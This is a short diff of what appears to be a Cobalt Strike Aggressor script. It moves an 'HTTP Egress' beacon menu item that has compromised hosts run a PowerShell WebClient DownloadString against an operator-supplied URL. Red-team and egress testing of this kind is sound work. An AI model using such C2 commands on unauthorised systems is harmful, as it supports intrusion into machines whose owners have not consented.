@@ -25,18 +25,16 @@ popup beacon_bottom {
 				blog($bid, "This beacon's ID is: " . binfo($bid, "id"));
 			}
 		}
-		menu "Windows" {
-			item "HTTP Egress" {
-				local('$bid');
-				foreach $bid ($1){
-					prompt_text("URL to assess?", "http://google.com", {
-						$httpDebugURL = $1;
-						return $httpDebugURL;
-					});
-					sleep(1);
-					binput($1, "powershell (New-Object System.Net.WebClient).DownloadString(\"$httpDebugURL\")");
-					bpowershell($1, "(New-Object System.Net.WebClient).DownloadString(\"$httpDebugURL\")");
-				}
+		item "HTTP Egress" {
+			local('$bid');
+			foreach $bid ($1){
+				prompt_text("URL to assess?", "http://google.com", {
+					$httpDebugURL = $1;
+					return $httpDebugURL;
+				});
+				sleep(1);
+				binput($1, "powershell (New-Object System.Net.WebClient).DownloadString(\"$httpDebugURL\")");
+				bpowershell($1, "(New-Object System.Net.WebClient).DownloadString(\"$httpDebugURL\")");
 			}
 		}
 	}
